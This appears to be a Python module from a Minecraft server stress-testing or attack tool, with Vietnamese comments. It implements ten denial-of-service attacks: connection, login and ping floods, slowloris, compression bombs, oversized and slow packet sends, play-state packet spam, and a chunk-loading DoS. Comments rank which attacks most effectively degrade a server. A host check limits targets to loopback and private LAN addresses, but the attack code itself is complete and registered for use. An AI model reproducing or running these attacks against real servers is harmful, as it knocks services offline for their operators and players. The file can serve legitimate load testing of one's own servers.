"""Các kịch bản mô phỏng tấn công (chỉ loopback + LAN private)."""
import ipaddress
import random
import socket
import ssl
import string
import struct
import threading
import time

from mcproto import (
    make_handshake, make_login_start, make_status_request,
    make_legacy_ping, pack_packet, write_varint, write_long,
    make_compression_bomb, make_rand_bytes_packet,
    MAX_PACKET_SIZE,
)
from mcclient import offline_login, pack_pkt, build_play_packet


# ============================================================
# HOST WHITELIST
# ============================================================
ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1", "0.0.0.0"}

_ALLOWED_EXACT = {"localhost", "127.0.0.1", "::1", "0.0.0.0"}
_ALLOWED_NETS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
]


def _check_host(host: str) -> None:
    """Chỉ cho phép loopback + private LAN. Chặn IP public / domain."""
    if host in _ALLOWED_EXACT:
        return
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        raise PermissionError(
            f"Chỉ cho phép IP private/loopback. Hostname '{host}' bị chặn."
        )
    for net in _ALLOWED_NETS:
        if ip in net:
            return
    raise PermissionError(
        f"IP '{host}' không thuộc dải private. Từ chối."
    )


# ============================================================
# HELPERS
# ============================================================
def rand_name(n: int = 10) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def _new_socket(host, port, timeout=3.0, nodelay=False, sndbuf=None,
                use_ssl=False):
    """Tạo socket đã connect sẵn với tuỳ chọn."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    if nodelay:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if sndbuf:
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, sndbuf)
        except OSError:
            pass
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    s.connect((host, port))
    return s


def _run_workers(worker_fn, workers: int):
    """Chạy `workers` thread với hàm worker_fn, join khi xong."""
    threads = [threading.Thread(target=worker_fn, daemon=True)
               for _ in range(workers)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()


# ============================================================
# NHÓM 1: KẾT NỐI / HANDSHAKE
# ============================================================
def conn_flood(host, port, workers=200, duration=30, use_ssl=False):
    """Mở hàng loạt kết nối TCP, không gửi gì — test backlog/accept queue."""
    _check_host(host)
    stop_at = time.time() + duration
    counter = {"ok": 0, "err": 0}

    def worker():
        while time.time() < stop_at:
            try:
                s = _new_socket(host, port, timeout=3, use_ssl=use_ssl)
                counter["ok"] += 1
                time.sleep(random.uniform(0.5, 2.0))
                s.close()
            except Exception:
                counter["err"] += 1

    _run_workers(worker, workers)
    return counter


def login_flood(host, port, workers=100, duration=30, protocol=763):
    """Gửi Handshake(state=login) + LoginStart liên tục — bão hòa auth queue."""
    _check_host(host)
    stop_at = time.time() + duration
    counter = {"ok": 0, "err": 0}

    def worker():
        while time.time() < stop_at:
            try:
                s = _new_socket(host, port, timeout=3)
                s.sendall(make_handshake(host, port, state=2, protocol=protocol))
                s.sendall(make_login_start(rand_name()))
                counter["ok"] += 1
                s.close()
            except Exception:
                counter["err"] += 1

    _run_workers(worker, workers)
    return counter


def ping_flood(host, port, workers=50, duration=30, protocol=763):
    """Gửi Server List Ping liên tục — test rate-limit ping."""
    _check_host(host)
    stop_at = time.time() + duration
    counter = {"ok": 0, "err": 0}

    def worker():
        while time.time() < stop_at:
            try:
                s = _new_socket(host, port, timeout=2)
                s.sendall(make_handshake(host, port, state=1, protocol=protocol))
                s.sendall(make_status_request())
                s.sendall(pack_packet(0x01, write_long(int(time.time() * 1000))))
                try:
                    s.recv(1024)
                except Exception:
                    pass
                counter["ok"] += 1
                s.close()
            except Exception:
                counter["err"] += 1

    _run_workers(worker, workers)
    return counter


def slowloris(host, port, workers=50, duration=60, protocol=763):
    """Mở kết nối, gửi handshake, rồi giữ socket idle lâu — test timeout."""
    _check_host(host)
    stop_at = time.time() + duration
    counter = {"ok": 0, "err": 0}

    def worker():
        while time.time() < stop_at:
            s = None
            try:
                s = _new_socket(host, port, timeout=5)
                s.sendall(make_handshake(host, port, state=2, protocol=protocol))
                pkt = make_login_start(rand_name())
                for b in pkt:
                    try:
                        s.sendall(bytes([b]))
                        time.sleep(0.5)
                    except Exception:
                        break
                counter["ok"] += 1
                time.sleep(random.uniform(5, 15))
            except Exception:
                counter["err"] += 1
            finally:
                if s:
                    try: s.close()
                    except Exception: pass

    _run_workers(worker, workers)
    return counter


def legacy_ping_flood(host, port, workers=50, duration=30):
    """Legacy ping (0xFE 0x01) — nhiều server chưa rate-limit."""
    _check_host(host)
    stop_at = time.time() + duration
    counter = {"ok": 0, "err": 0}
    pkt = make_legacy_ping(host, port)

    def worker():
        while time.time() < stop_at:
            try:
                s = _new_socket(host, port, timeout=2)
                s.sendall(pkt)
                try:
                    s.recv(1024)
                except Exception:
                    pass
                counter["ok"] += 1
                s.close()
            except Exception:
                counter["err"] += 1

    _run_workers(worker, workers)
    return counter


# ============================================================
# NHÓM 2: BIG PACKET / COMPRESSION
# ============================================================
def big_packet_burst(host, port, workers=20, duration=10,
                     packet_size=MAX_PACKET_SIZE, mode="random",
                     protocol=763, pipelined=10):
    """
    Gửi N packet lớn trong 1 kết nối, pipelined (không chờ response).
    mode: random | zeros | bomb | mixed
    """
    _check_host(host)
    stop_at = time.time() + duration
    counter = {"ok": 0, "err": 0, "bytes": 0}
    lock = threading.Lock()

    def build_payload():
        if mode == "random":
            return make_rand_bytes_packet(packet_size)
        if mode == "zeros":
            return pack_packet(0x00, b"\x00" * (packet_size - 1))
        if mode == "bomb":
            return make_compression_bomb(packet_size)
        r = random.random()
        if r < 0.33:
            return make_rand_bytes_packet(packet_size)
        if r < 0.66:
            return pack_packet(0x00, b"\x00" * (packet_size - 1))
        return make_compression_bomb(packet_size)

    def worker():
        while time.time() < stop_at:
            s = None
            try:
                s = _new_socket(host, port, timeout=5,
                                nodelay=True, sndbuf=4 * 1024 * 1024)
                s.sendall(make_handshake(host, port, state=2,
                                         protocol=protocol))
                for _ in range(pipelined):
                    if time.time() > stop_at:
                        break
                    pkt = build_payload()
                    s.sendall(pkt)
                    with lock:
                        counter["ok"] += 1
                        counter["bytes"] += len(pkt)
            except Exception:
                with lock:
                    counter["err"] += 1
            finally:
                if s:
                    try: s.close()
                    except Exception: pass

    _run_workers(worker, workers)
    return counter


def compression_bomb_flood(host, port, workers=30, duration=15,
                           protocol=763, decompressed_size=MAX_PACKET_SIZE):
    """Chỉ gửi compression bomb — bandwidth thấp nhưng RAM/CPU inflate cao."""
    _check_host(host)
    stop_at = time.time() + duration
    counter = {"ok": 0, "err": 0,
               "bytes_sent": 0, "bytes_decompressed": 0}
    lock = threading.Lock()
    bomb = make_compression_bomb(decompressed_size)

    def worker():
        while time.time() < stop_at:
            s = None
            try:
                s = _new_socket(host, port, timeout=5, nodelay=True)
                s.sendall(make_handshake(host, port, state=2,
                                         protocol=protocol))
                for _ in range(20):
                    if time.time() > stop_at:
                        break
                    s.sendall(bomb)
                    with lock:
                        counter["ok"] += 1
                        counter["bytes_sent"] += len(bomb)
                        counter["bytes_decompressed"] += decompressed_size
            except Exception:
                with lock:
                    counter["err"] += 1
            finally:
                if s:
                    try: s.close()
                    except Exception: pass

    _run_workers(worker, workers)
    return counter


def big_slow_send(host, port, workers=30, duration=30,
                  packet_size=MAX_PACKET_SIZE, chunk=8192, protocol=763):
    """Gửi 1 packet lớn chia chunk nhỏ, sleep giữa chunk — RAM leak."""
    _check_host(host)
    stop_at = time.time() + duration
    counter = {"ok": 0, "err": 0}
    lock = threading.Lock()

    def worker():
        while time.time() < stop_at:
            s = None
            try:
                s = _new_socket(host, port, timeout=10)
                s.sendall(make_handshake(host, port, state=2,
                                         protocol=protocol))
                pkt = make_rand_bytes_packet(packet_size)
                for i in range(0, len(pkt), chunk):
                    if time.time() > stop_at:
                        break
                    s.sendall(pkt[i:i + chunk])
                    time.sleep(0.01)
                with lock:
                    counter["ok"] += 1
                time.sleep(5)
            except Exception:
                with lock:
                    counter["err"] += 1
            finally:
                if s:
                    try: s.close()
                    except Exception: pass

    _run_workers(worker, workers)
    return counter


# ============================================================
# NHÓM 3: PLAY STATE (mạnh nhất — ăn vào Server thread)
# ============================================================
def play_flood(host, port, workers=50, duration=30, protocol=763,
               packet_mix=None, reconnect_every=0, packets_per_conn=500):
    """
    Full login (offline-mode) + spam packet ở PLAY state.
    Đòn thực sự ăn vào thread chính của server.
    """
    _check_host(host)
    if packet_mix is None:
        packet_mix = ["chat", "position", "update_sign", "click_window",
                      "player_action"]

    stop_at = time.time() + duration
    counter = {"ok": 0, "err": 0, "logins": 0}
    lock = threading.Lock()

    def worker():
        while time.time() < stop_at:
            s = None
            try:
                result = offline_login(host, port,
                                       protocol=protocol, timeout=15)
                if result is None:
                    with lock: counter["err"] += 1
                    time.sleep(0.05)
                    continue

                s, comp, thresh = result
                with lock: counter["logins"] += 1
                s.settimeout(5)

                conn_start = time.time()
                for _ in range(packets_per_conn):
                    if time.time() > stop_at:
                        break
                    if (reconnect_every and
                            time.time() - conn_start > reconnect_every):
                        break

                    kind = random.choice(packet_mix)
                    pk = build_play_packet(kind, protocol)
                    if pk is None:
                        continue
                    pid, payload = pk
                    try:
                        s.sendall(pack_pkt(pid, payload, comp, thresh))
                        with lock: counter["ok"] += 1
                    except Exception:
                        break
                    time.sleep(0.005)
            except Exception:
                with lock: counter["err"] += 1
            finally:
                if s:
                    try: s.close()
                    except Exception: pass

    _run_workers(worker, workers)
    return counter


def chunk_load_dos(host, port, workers=20, duration=60, protocol=763,
                   teleport_range=3.0e7):
    """
    Login → teleport liên tục xa → server phải load chunk mỗi lần.
    Đòn hiệu quả nhất để giảm TPS trên server offline-mode.
    """
    _check_host(host)
    stop_at = time.time() + duration
    counter = {"ok": 0, "err": 0, "logins": 0, "chunks_requested": 0}
    lock = threading.Lock()

    def worker():
        while time.time() < stop_at:
            s = None
            try:
                result = offline_login(host, port,
                                       protocol=protocol, timeout=15)
                if result is None:
                    with lock: counter["err"] += 1
                    time.sleep(0.05)
                    continue

                s, comp, thresh = result
                with lock: counter["logins"] += 1
                s.settimeout(5)

                while time.time() < stop_at:
                    x = random.uniform(-teleport_range, teleport_range)
                    z = random.uniform(-teleport_range, teleport_range)
                    y = 64.0
                    payload = struct.pack(">dddB", x, y, z, 1)
                    try:
                        s.sendall(pack_pkt(0x14, payload, comp, thresh))
                        with lock:
                            counter["ok"] += 1
                            counter["chunks_requested"] += 1
                        time.sleep(0.05)
                    except Exception:
                        break
            except Exception:
                with lock: counter["err"] += 1
            finally:
                if s:
                    try: s.close()
                    except Exception: pass

    _run_workers(worker, workers)
    return counter


# ============================================================
# REGISTRY
# ============================================================
ATTACKS = {
    # Nhóm 1: connection / handshake
    "conn":    conn_flood,
    "login":   login_flood,
    "ping":    ping_flood,
    "slow":    slowloris,
    "legacy":  legacy_ping_flood,

    # Nhóm 2: big packet / compression
    "big":     big_packet_burst,
    "bomb":    compression_bomb_flood,
    "bigslow": big_slow_send,

    # Nhóm 3: play state (mạnh nhất)
    "play":    play_flood,
    "chunk":   chunk_load_dos,
}